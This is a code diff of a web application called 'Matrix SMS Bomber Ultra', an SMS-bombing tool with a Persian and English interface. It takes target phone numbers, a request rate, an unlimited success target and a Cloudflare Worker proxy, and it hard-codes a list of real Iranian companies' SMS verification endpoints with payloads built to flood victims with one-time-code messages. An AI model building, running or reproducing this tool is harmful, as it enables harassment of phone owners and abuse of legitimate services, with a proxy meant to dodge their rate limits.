@@ -1,307 +1,484 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="en" dir="ltr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Matrix SMS Bomber Ultra</title>
-  <!-- Chart.js -->
-  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
-  <style>
-    :root {
-      --bg: #0a0a0a;
-      --glass: rgba(20,20,30,0.7);
-      --border: rgba(0,255,65,0.3);
-      --text: #e0ffe0;
-      --accent: #00ff41;
-      --green: #00ff41;
-      --red: #ff3333;
-      --radius: 16px;
-      --font: 'Segoe UI', 'Vazir', Tahoma, sans-serif;
-      --shadow: 0 0 25px rgba(0,255,65,0.2);
-    }
-    body.light {
-      --bg: #f0f4f0;
-      --glass: rgba(255,255,255,0.6);
-      --border: rgba(0,100,0,0.2);
-      --text: #0a0a0a;
-      --accent: #0a0;
-      --green: #0a0;
-      --red: #c00;
-      --shadow: 0 0 15px rgba(0,0,0,0.1);
-    }
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body {
-      font-family: var(--font);
-      background: var(--bg);
-      color: var(--text);
-      overflow-x: hidden;
-      transition: 0.3s;
-    }
-    #matrixCanvas {
-      position: fixed; top:0; left:0; width:100%; height:100%; z-index:0; opacity:0.3; pointer-events:none;
-    }
-    .container {
-      position: relative; z-index: 1; max-width: 1100px; margin: auto; padding: 20px;
-    }
-    .glass-card {
-      background: var(--glass); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
-      border: 1px solid var(--border); border-radius: var(--radius);
-      box-shadow: var(--shadow); padding: 20px; margin-bottom: 20px; transition: 0.3s;
-    }
-    h1 { font-size:2.5rem; color:var(--accent); text-shadow:0 0 10px var(--accent); margin-bottom:20px; text-align:center; }
-    .flex-row { display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
-    .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:15px; }
-    @media (max-width:600px) { .grid-2 { grid-template-columns:1fr; } }
-    label { display:block; margin-bottom:5px; font-weight:bold; }
-    input, select, textarea {
-      width:100%; padding:12px 15px; margin-bottom:15px;
-      background: rgba(0,0,0,0.3); border:1px solid var(--border);
-      border-radius:30px; color:var(--text); font-family:var(--font);
-      font-size:1rem; transition:0.3s; outline:none;
-    }
-    textarea { border-radius:16px; }
-    input:focus, select:focus, textarea:focus { border-color:var(--accent); box-shadow:0 0 15px var(--accent); }
-    button {
-      padding:12px 25px; border-radius:30px; border:none;
-      font-weight:bold; cursor:pointer; transition:0.3s; margin:5px;
-    }
-    .btn-start { background:var(--green); color:#000; box-shadow:0 0 20px var(--green); }
-    .btn-start:hover { transform:scale(1.05); }
-    .btn-stop { background:var(--red); color:#fff; box-shadow:0 0 20px var(--red); }
-    .btn-stop:hover { transform:scale(1.05); }
-    .stats { display:flex; flex-wrap:wrap; gap:10px; justify-content:space-around; margin-top:20px; }
-    .stat-box { background:rgba(0,0,0,0.3); border:1px solid var(--border); border-radius:12px; padding:10px 15px; text-align:center; flex:1; min-width:70px; backdrop-filter:blur(5px); }
-    .stat-label { font-size:0.8rem; opacity:0.8; }
-    .stat-value { font-size:1.5rem; font-weight:bold; }
-    .progress-outer { height:10px; background:rgba(255,255,255,0.1); border-radius:5px; margin:15px 0; overflow:hidden; }
-    .progress-inner { height:100%; width:0%; background:var(--accent); box-shadow:0 0 10px var(--accent); transition:width 0.3s; }
-    .log-box { background:rgba(0,0,0,0.4); border:1px solid var(--border); border-radius:12px; padding:15px; height:200px; overflow-y:auto; font-family:'Courier New', monospace; font-size:0.85rem; backdrop-filter:blur(5px); }
-    .tab-btn { background:transparent; border:1px solid var(--border); color:var(--text); margin-right:10px; }
-    .tab-btn.active { background:var(--accent); color:#000; }
-    canvas#liveChart { max-height:300px; margin-top:15px; }
-    .toolbar { position:fixed; top:20px; left:20px; z-index:2; display:flex; gap:10px; flex-wrap:wrap; }
-    .toolbar button { font-size:0.9rem; padding:8px 12px; background:var(--glass); border:1px solid var(--border); color:var(--text); border-radius:20px; backdrop-filter:blur(10px); }
-    .fullscreen { position:fixed; top:0; left:0; width:100%; height:100%; z-index:999; overflow:auto; }
-    .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:10; justify-content:center; align-items:center; }
-    .modal-content { background:var(--glass); backdrop-filter:blur(30px); border:1px solid var(--border); border-radius:var(--radius); padding:20px; max-width:500px; width:90%; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Matrix SMS Bomber Ultra</title>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+    <style>
+        :root {
+            --bg: #0a0a0a;
+            --glass: rgba(20,20,30,0.75);
+            --border: rgba(0,255,65,0.3);
+            --text: #e0ffe0;
+            --accent: #00ff41;
+            --green: #00ff41;
+            --red: #ff3333;
+            --radius: 16px;
+            --font: 'Segoe UI', 'Vazir', Tahoma, sans-serif;
+            --shadow: 0 0 25px rgba(0,255,65,0.2);
+            direction: ltr;
+            text-align: left;
+        }
+        body.rtl {
+            direction: rtl;
+            text-align: right;
+        }
+        body.light {
+            --bg: #f0f4f0;
+            --glass: rgba(255,255,255,0.65);
+            --border: rgba(0,100,0,0.2);
+            --text: #0a0a0a;
+            --accent: #0a0;
+            --green: #0a0;
+            --red: #c00;
+            --shadow: 0 0 15px rgba(0,0,0,0.1);
+        }
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            font-family: var(--font);
+            background: var(--bg);
+            color: var(--text);
+            overflow-x: hidden;
+            transition: 0.3s;
+        }
+        #matrixCanvas {
+            position: fixed; top:0; left:0; width:100%; height:100%; z-index:0; opacity:0.3; pointer-events:none;
+        }
+        .app-container {
+            position: relative;
+            z-index: 1;
+            max-width: 1200px;
+            margin: auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .toolbar {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: flex-end;
+            gap: 8px;
+            padding: 10px;
+        }
+        .toolbar button, .toolbar select {
+            background: var(--glass);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .toolbar button:hover { background: var(--accent); color: #000; }
+        .glass-card {
+            background: var(--glass);
+            backdrop-filter: blur(20px);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            padding: 20px;
+        }
+        h1 {
+            font-size: 2.5rem;
+            color: var(--accent);
+            text-shadow: 0 0 12px var(--accent);
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .settings-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+        }
+        .input-group {
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            font-weight: bold;
+            margin-bottom: 4px;
+        }
+        input, select, textarea {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            border-radius: 30px;
+            padding: 12px 15px;
+            color: var(--text);
+            font-family: var(--font);
+            font-size: 1rem;
+            transition: 0.2s;
+            outline: none;
+        }
+        input:focus, select:focus, textarea:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 10px var(--accent);
+        }
+        .btn-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        .btn {
+            padding: 12px 25px;
+            border-radius: 30px;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .btn-start { background: var(--green); color: #000; box-shadow: 0 0 15px var(--green); }
+        .btn-start:hover { transform: scale(1.03); }
+        .btn-stop { background: var(--red); color: #fff; box-shadow: 0 0 15px var(--red); }
+        .btn-stop:hover { transform: scale(1.03); }
+        .btn-secondary { background: var(--glass); border: 1px solid var(--border); color: var(--text); }
+        .tabs {
+            display: flex;
+            gap: 8px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+        .tab {
+            padding: 8px 18px;
+            border-radius: 20px;
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text);
+            cursor: pointer;
+        }
+        .tab.active { background: var(--accent); color: #000; }
+        .stats-row {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            justify-content: space-between;
+        }
+        .stat-card {
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 12px 20px;
+            text-align: center;
+            flex: 1 1 100px;
+            backdrop-filter: blur(5px);
+        }
+        .stat-label { font-size: 0.8rem; opacity: 0.8; }
+        .stat-value { font-size: 1.6rem; font-weight: bold; }
+        .progress-bar {
+            height: 8px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 4px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: var(--accent);
+            box-shadow: 0 0 8px var(--accent);
+            transition: width 0.3s;
+        }
+        .log-box {
+            background: rgba(0,0,0,0.4);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 15px;
+            height: 220px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            backdrop-filter: blur(5px);
+            white-space: pre-wrap;
+        }
+        .chart-container {
+            height: 300px;
+            position: relative;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top:0; left:0; width:100%; height:100%;
+            background: rgba(0,0,0,0.7);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background: var(--glass);
+            backdrop-filter: blur(25px);
+            border: 1px solid var(--border);
+            border-radius: var(--radius);
+            padding: 25px;
+            max-width: 500px;
+            width: 90%;
+            color: var(--text);
+        }
+        @media (max-width: 600px) {
+            .toolbar { justify-content: center; }
+            h1 { font-size: 1.8rem; }
+        }
+    </style>
 </head>
 <body class="dark">
-  <canvas id="matrixCanvas"></canvas>
-  <!-- نوار ابزار شناور -->
-  <div class="toolbar" id="toolbar">
-    <button onclick="toggleFullscreen()">⛶ تمام‌صفحه</button>
-    <button onclick="cycleTheme()">🎨 تغییر تم</button>
-    <button onclick="document.getElementById('helpModal').style.display='flex'">❓ راهنما</button>
-    <select id="profileSelect" onchange="loadProfile(this.value)" style="background:var(--glass); border:1px solid var(--border); color:var(--text); padding:5px 10px; border-radius:20px; backdrop-filter:blur(10px);">
-      <option value="">-- پروفایل‌ها --</option>
-    </select>
-    <button onclick="saveCurrentProfile()">💾 ذخیره پروفایل</button>
-    <button onclick="deleteProfile()">🗑️ حذف</button>
-  </div>
+    <canvas id="matrixCanvas"></canvas>
+    <div class="app-container">
+        <!-- نوار ابزار -->
+        <div class="toolbar">
+            <button onclick="toggleLanguage()" id="langToggle">🇮🇷 فارسی</button>
+            <button onclick="toggleTheme()" id="themeToggle">☀️ Light</button>
+            <button onclick="toggleFullscreen()">⛶ Fullscreen</button>
+            <select id="profileSelect" onchange="loadProfile(this.value)" style="min-width:120px;">
+                <option value="">Profiles</option>
+            </select>
+            <button onclick="saveCurrentProfile()">💾 Save</button>
+            <button onclick="deleteProfile()">🗑️ Delete</button>
+            <button onclick="showHelp()">❓ Help</button>
+        </div>
 
-  <!-- مودال راهنما -->
-  <div id="helpModal" class="modal" onclick="if(event.target==this) this.style.display='none'">
-    <div class="modal-content">
-      <h2>📘 راهنما</h2>
-      <p>1. شماره یا فایل شماره را وارد کنید.<br>2. تنظیمات را انجام دهید.<br>3. در صورت نیاز کلید دسترسی را در URL بگذارید (?key=secret).<br>4. شروع کنید.</p>
-      <button onclick="document.getElementById('helpModal').style.display='none'" class="btn-stop">بستن</button>
+        <!-- عنوان -->
+        <h1 id="mainTitle">🕶️ Matrix SMS Bomber Ultra</h1>
+
+        <!-- کارت تنظیمات -->
+        <div class="glass-card" id="settingsCard">
+            <div class="settings-grid">
+                <div class="input-group">
+                    <label id="lblPhones">📞 Phone Numbers (comma/newline separated)</label>
+                    <textarea id="phonesInput" rows="3" placeholder="09xxxxxxxxx, 09xxxxxxxxx"></textarea>
+                </div>
+                <div class="input-group">
+                    <label>📁 Or upload file</label>
+                    <input type="file" id="phonesFile" accept=".txt,.csv" onchange="loadPhonesFile()">
+                </div>
+                <div class="input-group">
+                    <label id="lblRate">⚡ Rate (req/s)</label>
+                    <input type="range" id="rateSlider" min="1" max="20" value="5" oninput="document.getElementById('rateVal').innerText=this.value">
+                    <span id="rateVal">5</span> req/s
+                </div>
+                <div class="input-group">
+                    <label id="lblTarget">🎯 Success target (empty=unlimited)</label>
+                    <input type="number" id="target" placeholder="e.g. 100">
+                </div>
+                <div class="input-group">
+                    <label id="lblScheduler">⏰ Start delay (seconds, 0=now)</label>
+                    <input type="number" id="scheduler" value="0" min="0">
+                </div>
+                <div class="input-group">
+                    <label>🌐 Proxy (Cloudflare Worker)</label>
+                    <div style="display:flex; align-items:center; gap:10px;">
+                        <input type="checkbox" id="useProxy" checked onchange="document.getElementById('proxyUrl').disabled=!this.checked">
+                        <span>Enable</span>
+                    </div>
+                    <input type="text" id="proxyUrl" placeholder="https://your-worker.workers.dev">
+                </div>
+            </div>
+
+            <div class="btn-row">
+                <button class="btn btn-start" id="startBtn" onclick="startAttack()">▶ Start</button>
+                <button class="btn btn-stop" id="stopBtn" onclick="stopAttack()" disabled>⏹ Stop</button>
+                <button class="btn btn-secondary" onclick="resetAll()">↺ Reset</button>
+            </div>
+
+            <!-- تب‌ها -->
+            <div class="tabs">
+                <button class="tab active" onclick="switchTab('stats')">📊 Stats</button>
+                <button class="tab" onclick="switchTab('chart')">📈 Chart</button>
+                <button class="tab" onclick="switchTab('log')">📝 Log</button>
+            </div>
+
+            <!-- پنل‌ها -->
+            <div id="statsPanel">
+                <div class="stats-row">
+                    <div class="stat-card"><div class="stat-label" id="lblTotal">Total</div><div class="stat-value" id="total">0</div></div>
+                    <div class="stat-card"><div class="stat-label" style="color:var(--green)">Success</div><div class="stat-value" id="success" style="color:var(--green)">0</div></div>
+                    <div class="stat-card"><div class="stat-label" style="color:var(--red)">Failed</div><div class="stat-value" id="fail" style="color:var(--red)">0</div></div>
+                    <div class="stat-card"><div class="stat-label">Rate</div><div class="stat-value" id="rateDisp">0</div></div>
+                    <div class="stat-card"><div class="stat-label">% Success</div><div class="stat-value" id="percent">0%</div></div>
+                    <div class="stat-card"><div class="stat-label">ETA</div><div class="stat-value" id="eta">--</div></div>
+                </div>
+                <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
+            </div>
+
+            <div id="chartPanel" style="display:none;">
+                <div class="chart-container"><canvas id="liveChart"></canvas></div>
+            </div>
+
+            <div id="logPanel" style="display:block;">
+                <div class="log-box" id="logBox">⏳ Ready...</div>
+            </div>
+        </div>
     </div>
-  </div>
 
-  <div class="container">
-    <h1>🕶️ Matrix SMS Bomber Ultra</h1>
-
-    <!-- کارت تنظیمات -->
-    <div class="glass-card">
-      <div class="grid-2">
-        <div>
-          <label>📞 شماره موبایل (تکی یا با کاما جدا کنید)</label>
-          <input type="text" id="phonesInput" placeholder="09xxxxxxxxx, 09xxxxxxxxx">
+    <!-- مودال راهنما -->
+    <div id="helpModal" class="modal" onclick="if(event.target===this) this.style.display='none'">
+        <div class="modal-content">
+            <h2>📘 Help</h2>
+            <p>Enter phone numbers, configure rate & target, enable proxy with your Cloudflare Worker URL, and start. Access key can be set via URL parameter <code>?key=YOUR_SECRET</code>.</p>
+            <button class="btn btn-stop" onclick="document.getElementById('helpModal').style.display='none'">Close</button>
         </div>
-        <div>
-          <label>📁 یا فایل شماره (هر خط یک شماره)</label>
-          <input type="file" id="phonesFile" accept=".txt,.csv" onchange="loadPhonesFile()">
-        </div>
-        <div>
-          <label>⚡ نرخ ارسال (req/s)</label>
-          <input type="range" id="rateSlider" min="1" max="20" value="5" oninput="document.getElementById('rateVal').innerText=this.value">
-          <span id="rateVal">5</span> req/s
-        </div>
-        <div>
-          <label>🎯 هدف موفق (خالی = نامحدود)</label>
-          <input type="number" id="target" placeholder="مثلاً 100">
-        </div>
-        <div>
-          <label>⏰ زمان‌بندی (زمان شروع به ثانیه، 0 = فوری)</label>
-          <input type="number" id="scheduler" value="0" min="0">
-        </div>
-        <div>
-          <label>🌐 پروکسی (Cloudflare Worker)</label>
-          <div class="flex-row">
-            <input type="checkbox" id="useProxy" checked onchange="toggleProxyInput()">
-            <label for="useProxy">فعال</label>
-          </div>
-          <input type="text" id="proxyUrl" placeholder="https://your-worker.workers.dev">
-        </div>
-      </div>
-
-      <div class="flex-row">
-        <button class="btn-start" id="startBtn" onclick="startAttack()">▶ شروع</button>
-        <button class="btn-stop" id="stopBtn" onclick="stopAttack()" disabled>⏹ توقف</button>
-        <button onclick="resetForm()">🔄 بازنشانی</button>
-      </div>
-
-      <!-- تب‌ها -->
-      <div class="flex-row" style="margin-top:15px;">
-        <button class="tab-btn active" onclick="switchTab('stats')">📊 آمار</button>
-        <button class="tab-btn" onclick="switchTab('chart')">📈 نمودار</button>
-        <button class="tab-btn" onclick="switchTab('log')">📝 لاگ</button>
-      </div>
-
-      <!-- پنل آمار -->
-      <div id="statsPanel">
-        <div class="stats">
-          <div class="stat-box"><div class="stat-label">کل</div><div class="stat-value" id="total">0</div></div>
-          <div class="stat-box"><div class="stat-label" style="color:var(--green)">موفق</div><div class="stat-value" id="success" style="color:var(--green)">0</div></div>
-          <div class="stat-box"><div class="stat-label" style="color:var(--red)">خطا</div><div class="stat-value" id="fail" style="color:var(--red)">0</div></div>
-          <div class="stat-box"><div class="stat-label">نرخ</div><div class="stat-value" id="rateDisp">0</div></div>
-          <div class="stat-box"><div class="stat-label">٪ موفقیت</div><div class="stat-value" id="percent">0%</div></div>
-          <div class="stat-box"><div class="stat-label">زمان باقی‌مانده</div><div class="stat-value" id="eta">--</div></div>
-        </div>
-        <div class="progress-outer"><div class="progress-inner" id="progressBar"></div></div>
-      </div>
-
-      <!-- پنل نمودار (مخفی) -->
-      <div id="chartPanel" style="display:none;">
-        <canvas id="liveChart" width="400" height="200"></canvas>
-      </div>
-
-      <!-- پنل لاگ (همیشه بخشی از آن نشان داده می‌شود) -->
-      <div class="log-box" id="logBox" style="display:block;">⏳ آمادهٔ عملیات...</div>
     </div>
-  </div>
 
-  <script>
-    // ==================== ماتریکس ====================
-    const canvas = document.getElementById('matrixCanvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    const letters = '01アビルカドク';
-    const fontSize = 14;
-    let columns = canvas.width / fontSize;
-    let drops = Array(Math.floor(columns)).fill(1);
-    function drawMatrix() {
-      ctx.fillStyle = 'rgba(0,0,0,0.05)';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      const accent = getComputedStyle(document.body).getPropertyValue('--accent').trim() || '#00ff41';
-      ctx.fillStyle = accent;
-      ctx.font = fontSize + 'px monospace';
-      for (let i = 0; i < drops.length; i++) {
-        const text = letters[Math.floor(Math.random() * letters.length)];
-        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-        drops[i]++;
-      }
-    }
-    setInterval(drawMatrix, 40);
-    window.addEventListener('resize', () => {
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-      columns = canvas.width / fontSize;
-      drops = Array(Math.floor(columns)).fill(1);
-    });
-
-    // ==================== تم‌ها ====================
-    const themes = ['dark', 'light'];
-    let currentTheme = 0;
-    function cycleTheme() {
-      currentTheme = (currentTheme + 1) % themes.length;
-      document.body.className = themes[currentTheme];
-    }
-    document.getElementById('toggleTheme').addEventListener('click', cycleTheme);
-
-    // ==================== تمام‌صفحه ====================
-    function toggleFullscreen() {
-      if (!document.fullscreenElement) {
-        document.documentElement.requestFullscreen();
-      } else {
-        document.exitFullscreen();
-      }
-    }
-
-    // ==================== پروفایل‌ها با IndexedDB ====================
-    const DB_NAME = 'smsBomberDB';
-    const STORE_NAME = 'profiles';
-    let db;
-    const request = indexedDB.open(DB_NAME, 1);
-    request.onupgradeneeded = (e) => {
-      db = e.target.result;
-      if (!db.objectStoreNames.contains(STORE_NAME)) {
-        db.createObjectStore(STORE_NAME, { keyPath: 'name' });
-      }
-    };
-    request.onsuccess = (e) => {
-      db = e.target.result;
-      loadProfileList();
-    };
-
-    function saveProfile(name, data) {
-      const tx = db.transaction(STORE_NAME, 'readwrite');
-      tx.objectStore(STORE_NAME).put({ name, data });
-      tx.oncomplete = () => loadProfileList();
-    }
-    function loadProfile(name) {
-      if (!name) return;
-      const tx = db.transaction(STORE_NAME, 'readonly');
-      const req = tx.objectStore(STORE_NAME).get(name);
-      req.onsuccess = () => {
-        if (req.result) {
-          const d = req.result.data;
-          document.getElementById('phonesInput').value = d.phones || '';
-          document.getElementById('rateSlider').value = d.rate || 5;
-          document.getElementById('rateVal').innerText = d.rate || 5;
-          document.getElementById('target').value = d.target || '';
-          document.getElementById('proxyUrl').value = d.proxy || DEFAULT_PROXY;
+    <script>
+        // ==================== ماتریکس ====================
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const letters = '01アビルカドク';
+        const fontSize = 14;
+        let columns = canvas.width / fontSize;
+        let drops = Array(Math.floor(columns)).fill(1);
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0,0,0,0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            const accent = getComputedStyle(document.body).getPropertyValue('--accent').trim() || '#00ff41';
+            ctx.fillStyle = accent;
+            ctx.font = fontSize + 'px monospace';
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
         }
-      };
-    }
-    function deleteProfile() {
-      const sel = document.getElementById('profileSelect');
-      const name = sel.value;
-      if (!name) return;
-      const tx = db.transaction(STORE_NAME, 'readwrite');
-      tx.objectStore(STORE_NAME).delete(name);
-      tx.oncomplete = () => loadProfileList();
-    }
-    function loadProfileList() {
-      const sel = document.getElementById('profileSelect');
-      sel.innerHTML = '<option value="">-- پروفایل‌ها --</option>';
-      const tx = db.transaction(STORE_NAME, 'readonly');
-      const req = tx.objectStore(STORE_NAME).getAll();
-      req.onsuccess = () => {
-        req.result.forEach(p => {
-          const opt = document.createElement('option');
-          opt.value = p.name;
-          opt.textContent = p.name;
-          sel.appendChild(opt);
+        setInterval(drawMatrix, 40);
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            columns = canvas.width / fontSize;
+            drops = Array(Math.floor(columns)).fill(1);
         });
-      };
-    }
-    function saveCurrentProfile() {
-      const name = prompt('نام پروفایل:');
-      if (!name) return;
-      saveProfile(name, {
-        phones: document.getElementById('phonesInput').value,
-        rate: document.getElementById('rateSlider').value,
-        target: document.getElementById('target').value,
-        proxy: document.getElementById('proxyUrl').value
-      });
-    }
 
-    // ==================== API Templates (بخشی) ====================
-    const API_TEMPLATES = [
+        // ==================== چند زبانه ====================
+        let lang = 'en';
+        const texts = {
+            en: {
+                title: '🕶️ Matrix SMS Bomber Ultra',
+                lblPhones: '📞 Phone Numbers (comma/newline separated)',
+                lblRate: '⚡ Rate (req/s)',
+                lblTarget: '🎯 Success target (empty=unlimited)',
+                lblScheduler: '⏰ Start delay (seconds, 0=now)',
+                lblTotal: 'Total',
+                startBtn: '▶ Start',
+                stopBtn: '⏹ Stop',
+                resetBtn: '↺ Reset',
+                logReady: '⏳ Ready...',
+            },
+            fa: {
+                title: '🕶️ ماتریکس اس‌ام‌اس بامبر اولترا',
+                lblPhones: '📞 شماره موبایل (با کاما یا خط جدید جدا کنید)',
+                lblRate: '⚡ نرخ ارسال (req/s)',
+                lblTarget: '🎯 هدف موفق (خالی = نامحدود)',
+                lblScheduler: '⏰ تأخیر شروع (ثانیه، ۰ = فوری)',
+                lblTotal: 'کل',
+                startBtn: '▶ شروع',
+                stopBtn: '⏹ توقف',
+                resetBtn: '↺ بازنشانی',
+                logReady: '⏳ آماده...',
+            }
+        };
+        function setLanguage(langCode) {
+            lang = langCode;
+            const t = texts[langCode];
+            document.getElementById('mainTitle').innerText = t.title;
+            document.getElementById('lblPhones').innerText = t.lblPhones;
+            document.getElementById('lblRate').innerText = t.lblRate;
+            document.getElementById('lblTarget').innerText = t.lblTarget;
+            document.getElementById('lblScheduler').innerText = t.lblScheduler;
+            document.getElementById('lblTotal').innerText = t.lblTotal;
+            document.getElementById('startBtn').innerText = t.startBtn;
+            document.getElementById('stopBtn').innerText = t.stopBtn;
+            document.querySelector('.btn-secondary').innerText = t.resetBtn;
+            document.getElementById('logBox').innerHTML = t.logReady;
+            if (langCode === 'fa') {
+                document.body.classList.add('rtl');
+                document.getElementById('langToggle').innerHTML = '🇬🇧 English';
+            } else {
+                document.body.classList.remove('rtl');
+                document.getElementById('langToggle').innerHTML = '🇮🇷 فارسی';
+            }
+        }
+        document.getElementById('langToggle').addEventListener('click', () => {
+            setLanguage(lang === 'en' ? 'fa' : 'en');
+        });
+        // پیش‌فرض انگلیسی
+        setLanguage('en');
+
+        // ==================== تم ====================
+        let isDark = true;
+        function toggleTheme() {
+            isDark = !isDark;
+            document.body.classList.toggle('light', !isDark);
+            document.getElementById('themeToggle').innerHTML = isDark ? '☀️ Light' : '🌙 Dark';
+        }
+        document.getElementById('themeToggle').addEventListener('click', toggleTheme);
+
+        // ==================== تمام‌صفحه ====================
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) document.documentElement.requestFullscreen();
+            else document.exitFullscreen();
+        }
+
+        // ==================== پروفایل‌ها ====================
+        const DB_NAME = 'smsBomberDB', STORE_NAME = 'profiles';
+        let db;
+        const openDB = indexedDB.open(DB_NAME, 1);
+        openDB.onupgradeneeded = e => { db = e.target.result; db.createObjectStore(STORE_NAME, { keyPath: 'name' }); };
+        openDB.onsuccess = e => { db = e.target.result; loadProfileList(); };
+
+        function loadProfileList() {
+            const tx = db.transaction(STORE_NAME, 'readonly');
+            const sel = document.getElementById('profileSelect');
+            sel.innerHTML = '<option value="">Profiles</option>';
+            tx.objectStore(STORE_NAME).getAll().onsuccess = e => {
+                e.target.result.forEach(p => {
+                    const opt = document.createElement('option');
+                    opt.value = p.name; opt.textContent = p.name; sel.appendChild(opt);
+                });
+            };
+        }
+        function saveProfile(name, data) {
+            const tx = db.transaction(STORE_NAME, 'readwrite');
+            tx.objectStore(STORE_NAME).put({ name, data });
+            tx.oncomplete = () => loadProfileList();
+        }
+        function loadProfile(name) {
+            if (!name) return;
+            const tx = db.transaction(STORE_NAME, 'readonly');
+            tx.objectStore(STORE_NAME).get(name).onsuccess = e => {
+                if (e.target.result) {
+                    const d = e.target.result.data;
+                    document.getElementById('phonesInput').value = d.phones || '';
+                    document.getElementById('rateSlider').value = d.rate || 5;
+                    document.getElementById('rateVal').innerText = d.rate || 5;
+                    document.getElementById('target').value = d.target || '';
+                    document.getElementById('proxyUrl').value = d.proxy || DEFAULT_PROXY;
+                }
+            };
+        }
+        function saveCurrentProfile() {
+            const name = prompt('Profile name:');
+            if (!name) return;
+            saveProfile(name, {
+                phones: document.getElementById('phonesInput').value,
+                rate: document.getElementById('rateSlider').value,
+                target: document.getElementById('target').value,
+                proxy: document.getElementById('proxyUrl').value
+            });
+        }
+        function deleteProfile() {
+            const name = document.getElementById('profileSelect').value;
+            if (!name) return;
+            const tx = db.transaction(STORE_NAME, 'readwrite');
+            tx.objectStore(STORE_NAME).delete(name);
+            tx.oncomplete = () => loadProfileList();
+        }
+
+        // ==================== API Templates (بخشی) ====================
+        const API_TEMPLATES = [
             {"source":"neshan.org","url":"https://neshan.org/maps/pwa-api/login/sms/request?mobileNumber=0{phone}&uuid=web_019e8459-9674-749c-bfe3-7b0364eba2d9","method":"GET","capacity":10},
             {"source":"#karnaval.ir","url":"https://www.karnaval.ir/api/gateway/marketing-campaign-mobile-popup/marketing-campaign-mobile-popup/create","method":"POST","body":'{"campaignId":"000000000000000000000001","mobile":"0{phone}"}',"capacity":10},
             {"source":"balad.ir","url":"https://account.api.balad.ir/api/web/auth/login/","method":"POST","body":'{"phone_number":"0{phone}","os_type":"W"}',"capacity":10},
@@ -405,241 +582,159 @@
             {"source":"zap-express.com","url":"https://api.zap-express.com/fr/Registration/SendVerificationCode","method":"POST","body":'{"mobile":"0{phone}","registrationCategoryId":1,"representativeCode":"","utmInfo":{"utM_Source":"alopeyk","utM_Medium":"online","utM_Campaign":"site","utM_Content":"","utM_Term":""}}',"capacity":1},
             {"source":"zigap.ir","url":"https://gateway.zigap.ir/api/v1.9/authenticate/sendotp","method":"POST","body":'{"phoneNumber":"+98{phone}"}',"capacity":20}
         ];
-    // ==================== متغیرها ====================
-    let stats = { total: 0, success: 0, fail: 0 };
-    let stopFlag = false;
-    let startTime = 0;
-    let phoneList = [];
-    let currentPhoneIndex = 0;
-    const DEFAULT_PROXY = 'https://smsbomber.game-developer-mb.workers.dev';
-    document.getElementById('proxyUrl').value = localStorage.getItem('proxyUrl') || DEFAULT_PROXY;
-    let chartInstance = null;
 
-    const logBox = document.getElementById('logBox');
-    function log(msg) {
-      const time = new Date().toLocaleTimeString('fa-IR');
-      logBox.innerHTML += `[${time}] ${msg}\n`;
-      logBox.scrollTop = logBox.scrollHeight;
-    }
+        // ==================== متغیرها ====================
